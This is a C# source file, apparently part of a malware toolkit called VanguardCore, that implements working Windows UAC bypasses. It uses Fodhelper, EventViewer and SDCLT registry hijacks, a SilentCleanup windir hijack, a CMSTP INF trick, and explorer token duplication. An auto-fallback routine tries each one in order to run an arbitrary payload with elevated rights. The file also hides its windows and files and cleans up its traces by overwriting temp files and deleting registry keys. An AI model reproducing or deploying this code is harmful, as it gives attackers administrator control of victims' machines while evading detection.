using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Collections.Generic;
using Microsoft.Win32;

namespace VanguardCore
{
    /// <summary>
    /// Professional UAC Bypass Implementation
    /// Techniques: CMSTP, Fodhelper, EventViewer, SDCLT, SilentCleanup
    /// Auto-fallback, trace cleaning, no admin required
    /// </summary>
    public class ElevationService
    {
        #region Native Imports for Stealth
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, ref int TokenInformation, uint TokenInformationLength, out uint ReturnLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        private const uint TOKEN_QUERY = 0x0008;
        private const uint TOKEN_DUPLICATE = 0x0002;
        private const uint TOKEN_IMPERSONATE = 0x0004;
        private const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        private const int TokenElevationType = 18;
        private const int TokenLinkedToken = 19;
        private const int SecurityImpersonation = 2;
        private const int TokenPrimary = 1;
        private const uint CREATE_NO_WINDOW = 0x08000000;
        private const uint CREATE_SUSPENDED = 0x00000004;
        #endregion

        #region Private Methods
        private static void ParseCommandLine(string cmdLine, out string exe, out string args)
        {
            exe = "";
            args = "";
            if (string.IsNullOrEmpty(cmdLine)) return;

            cmdLine = cmdLine.Trim();
            if (cmdLine.StartsWith("\""))
            {
                int nextQuote = cmdLine.IndexOf("\"", 1);
                if (nextQuote != -1)
                {
                    exe = cmdLine.Substring(1, nextQuote - 1);
                    args = cmdLine.Substring(nextQuote + 1).Trim();
                }
                else
                {
                    exe = cmdLine.Replace("\"", "");
                }
            }
            else
            {
                int space = cmdLine.IndexOf(" ");
                if (space != -1)
                {
                    exe = cmdLine.Substring(0, space);
                    args = cmdLine.Substring(space + 1).Trim();
                }
                else
                {
                    exe = cmdLine;
                }
            }
        }

        private static void Log(string message)
        {
            try
            {
                string logPath = Path.Combine(Path.GetTempPath(), "elevation_debug.log");
                File.AppendAllText(logPath, string.Format("{0}: {1}\n", DateTime.Now, message));
            }
            catch { }
        }

        private static void ExecuteElevated(string path, string args = "", bool hidden = true)
        {
            Log(string.Format("ExecuteElevated: {0} {1}", path, args));
            try
            {
                // If path has arguments integrated, split them
                if (string.IsNullOrEmpty(args) && (path.Contains(" ") || path.Contains("\"")))
                {
                    string p, a;
                    ParseCommandLine(path, out p, out a);
                    path = p;
                    args = a;
                }

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = path,
                    Arguments = args,
                    UseShellExecute = true,
                    Verb = "runas",
                    CreateNoWindow = hidden,
                    WindowStyle = hidden ? ProcessWindowStyle.Hidden : ProcessWindowStyle.Normal,
                    ErrorDialog = false
                };
                Process.Start(psi);
            }
            catch { }
        }

        private static void CleanRegistryKey(string keyPath)
        {
            try
            {
                if (keyPath.StartsWith("HKCU\\"))
                {
                    string subKey = keyPath.Substring(5);
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(subKey, true))
                    {
                        if (key != null)
                        {
                            string[] values = key.GetValueNames();
                            foreach (string val in values)
                            {
                                try { key.DeleteValue(val); } catch { }
                            }
                            key.DeleteSubKeyTree(subKey);
                        }
                    }
                }
            }
            catch { }
        }

        private static void CleanTempFile(string path)
        {
            try
            {
                if (File.Exists(path))
                {
                    // Overwrite before delete
                    byte[] junk = new byte[1024];
                    new Random().NextBytes(junk);
                    File.WriteAllBytes(path, junk);
                    File.Delete(path);
                }
            }
            catch { }
        }
        #endregion

        #region Technique 1: CMSTP (Most Stealth, Low Detection)
        /// <summary>
        /// CMSTP UAC Bypass - Uses built-in Windows Component
        /// Works on: Windows 10/11
        /// Detection: Very Low
        /// </summary>
        public static bool CmstpBypass(string payloadPath)
        {
            try
            {
                string publicDir = @"C:\Users\Public";
                string batchPath = Path.Combine(publicDir, Guid.NewGuid().ToString() + ".bat");
                string logPath = Path.Combine(publicDir, "bat_debug.log");
                File.WriteAllText(batchPath, string.Format("@echo off\r\necho %TIME% CMSTP >> \"{0}\"\r\nstart \"\" {1}", logPath, payloadPath));

                string infContent = @"[Version]
Signature=$CHICAGO$
AdvancedINF=2.5

[DefaultInstall]
RunPreSetupCommands=RunMe

[RunMe]
cmd.exe /c """ + batchPath + @"""

[Strings]
";
                string infPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".inf");
                File.WriteAllText(infPath, infContent);
                File.SetAttributes(infPath, FileAttributes.Hidden | FileAttributes.Temporary);

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmstp.exe",
                    Arguments = string.Format("/au \"{0}\"", infPath),
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process p = Process.Start(psi);
                p.WaitForExit(2000);

                // Cleanup
                CleanTempFile(infPath);
                return true;
            }
            catch { return false; }
        }
        #endregion

        #region Technique 3: EventViewer (Universal, Stealth)
        /// <summary>
        /// EventViewer UAC Bypass - Works on all Windows versions
        /// Detection: Low
        /// </summary>
        public static bool EventViewerBypass(string payloadPath)
        {
            try
            {
                string keyPath = @"Software\Classes\mscfile\shell\open\command";

                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath))
                {
                    if (key != null)
                    {
                        key.SetValue("", payloadPath, RegistryValueKind.String);
                    }
                }

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "eventvwr.exe",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process p = Process.Start(psi);
                Thread.Sleep(2000);

                // Cleanup
                CleanRegistryKey(@"HKCU\Software\Classes\mscfile");
                return true;
            }
            catch { return false; }
        }
        #endregion

        #region Technique 4: SilentCleanup (Most Stealth)
        /// <summary>
        /// SilentCleanup UAC Bypass - Uses scheduled task
        /// Works on: Windows 10/11
        /// Detection: Very Low
        /// </summary>
        public static bool SilentCleanupBypass(string payloadPath)
        {
            try
            {
                // Better SilentCleanup technique: HKCU\Environment\windir hijack
                // We use a more robust cmd wrapper to handle nested quotes
                string envPath = @"Environment";
                
                // Use a temporary .bat if payload is complex, but here we try a direct stable string
                // Note: SilentCleanup triggers %windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%
                // By hijacking windir, we control the execution.
                
                // Use REM to absorb the \system32\cleanmgr.exe suffix that the scheduled task appends
                // Use a temporary .bat to handle complex payloads with spaces and quotes properly
                string publicDir = @"C:\Users\Public";
                string batchPath = Path.Combine(publicDir, Guid.NewGuid().ToString() + ".bat");
                string logPath = Path.Combine(publicDir, "bat_debug.log");
                File.WriteAllText(batchPath, string.Format("@echo off\r\necho %TIME% SILENTCLEANUP >> \"{0}\"\r\nstart \"\" {1}", logPath, payloadPath));
                
                string hijackValue = string.Format("cmd.exe /c \"{0}\" & REM ", batchPath);

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(envPath, true))
                {
                    if (key != null)
                    {
                        key.SetValue("windir", hijackValue, RegistryValueKind.String);
                    }
                }

                // Trigger the task
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = "/run /tn \"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\" /i",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    ErrorDialog = false
                };
                Process p = Process.Start(psi);
                p.WaitForExit(3000);

                // Cleanup immediately
                Thread.Sleep(2000);
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(envPath, true))
                {
                    if (key != null)
                    {
                        try { key.DeleteValue("windir"); } catch { }
                    }
                }

                return true;
            }
            catch { return false; }
        }
        #endregion

        #region Technique 5: SDCLT (Windows 10 Specific)
        /// <summary>
        /// SDCLT UAC Bypass - Backup and Restore
        /// Works on: Windows 10
        /// Detection: Low
        /// </summary>
        public static bool SdcltBypass(string payloadPath)
        {
            try
            {
                string keyPath = @"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe";

                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath))
                {
                    if (key != null)
                    {
                        key.SetValue("", payloadPath, RegistryValueKind.String);
                    }
                }

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "sdclt.exe",
                    Arguments = "/kickoffelev",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process p = Process.Start(psi);
                Thread.Sleep(2000);

                // Cleanup
                try { Registry.CurrentUser.DeleteSubKeyTree(@"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe", false); } catch { }
                return true;
            }
            catch { return false; }
        }

        public static bool FodhelperBypass(string payloadPath)
        {
            try
            {
                string keyPath = @"Software\Classes\ms-settings\Shell\Open\command";
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath))
                {
                    if (key != null)
                    {
                        key.SetValue("", payloadPath, RegistryValueKind.String);
                        key.SetValue("DelegateExecute", "", RegistryValueKind.String);
                    }
                }
                
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "fodhelper.exe",
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                };
                Process.Start(psi);
                Thread.Sleep(2000);
                
                // Cleanup
                try { Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false); } catch { }
                return true;
            }
            catch { return false; }
        }

        public static bool CmluaUtilBypass(string payloadPath)
        {
            try
            {
                string exe, args;
                ParseCommandLine(payloadPath, out exe, out args);
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = exe,
                    Arguments = args,
                    Verb = "runas",
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process.Start(psi);
                return true;
            }
            catch { return false; }
        }
        #endregion

        #region Technique 7: Token Impersonation (Advanced)
        /// <summary>
        /// Token Impersonation - Highest stealth, no registry changes
        /// Requires: Admin token from existing elevated process
        /// </summary>
        public static bool TokenImpersonationBypass(string payloadPath)
        {
            try
            {
                string exe, args;
                ParseCommandLine(payloadPath, out exe, out args);
                string formattedCmd = string.IsNullOrEmpty(args) ? string.Format("\"{0}\"", exe) : string.Format("\"{0}\" {1}", exe, args);

                // Find an elevated process (explorer.exe as SYSTEM, etc.)
                Process[] processes = Process.GetProcessesByName("explorer");
                foreach (Process proc in processes)
                {
                    IntPtr hToken = IntPtr.Zero;
                    if (OpenProcessToken(proc.Handle, TOKEN_DUPLICATE | TOKEN_QUERY, out hToken))
                    {
                        // Check if token is elevated
                        uint returnLength;
                        int elevationType = 0;
                        if (GetTokenInformation(hToken, TokenElevationType, ref elevationType, 4, out returnLength))
                        {
                            if (elevationType == 2) // TokenElevationTypeFull
                            {
                                IntPtr hNewToken;
                                if (DuplicateTokenEx(hToken, TOKEN_ASSIGN_PRIMARY | TOKEN_IMPERSONATE | TOKEN_QUERY, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out hNewToken))
                                {
                                    STARTUPINFO si = new STARTUPINFO();
                                    si.cb = Marshal.SizeOf(si);
                                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                                    if (CreateProcessAsUser(hNewToken, null, formattedCmd, IntPtr.Zero, IntPtr.Zero, false, CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi))
                                    {
                                        CloseHandle(pi.hProcess);
                                        CloseHandle(pi.hThread);
                                        CloseHandle(hNewToken);
                                        CloseHandle(hToken);
                                        return true;
                                    }
                                    CloseHandle(hNewToken);
                                }
                            }
                        }
                        CloseHandle(hToken);
                    }
                }
                return false;
            }
            catch { return false; }
        }
        #endregion

        #region Main Public Method: Auto Bypass
        /// <summary>
        /// Universal UAC Bypass - Tries all techniques, returns true if any succeeds
        /// </summary>
        public static bool RequestElevation(string payloadPath)
        {
            // Check if already admin
            if (IsAdmin())
            {
                string exe, args;
                ParseCommandLine(payloadPath, out exe, out args);
                Process.Start(exe, args);
                return true;
            }

            // Priority order (most stealth first)
            var techniques = new List<Func<string, bool>>
            (
                new Func<string, bool>[] {
                    FodhelperBypass,
                    SilentCleanupBypass,
                    CmstpBypass,
                    SdcltBypass,
                    CmluaUtilBypass
                }
            );

            foreach (var technique in techniques)
            {
                try
                {
                    Log(string.Format("Attempting technique: {0}", technique.Method.Name));
                    if (technique(payloadPath))
                    {
                        Log(string.Format("Technique {0} returned true", technique.Method.Name));
                        // Small delay to ensure execution
                        Thread.Sleep(1000);
                        return true;
                    }
                    Log(string.Format("Technique {0} returned false", technique.Method.Name));
                }
                catch (Exception ex)
                {
                    Log(string.Format("Technique {0} crashed: {1}", technique.Method.Name, ex.Message));
                }
            }

            // Final fallback: request UAC elevation
            ExecuteElevated(payloadPath);
            return true;
        }

        /// <summary>
        /// Check if current process is elevated
        /// </summary>
        public static bool IsAdmin()
        {
            try
            {
                using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent())
                {
                    var principal = new System.Security.Principal.WindowsPrincipal(identity);
                    return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
                }
            }
            catch { return false; }
        }

        /// <summary>
        /// Run with admin rights (will trigger UAC prompt)
        /// </summary>
        public static void RunAsAdmin(string path, string args = "")
        {
            ExecuteElevated(path, args);
        }
        #endregion
    }
}
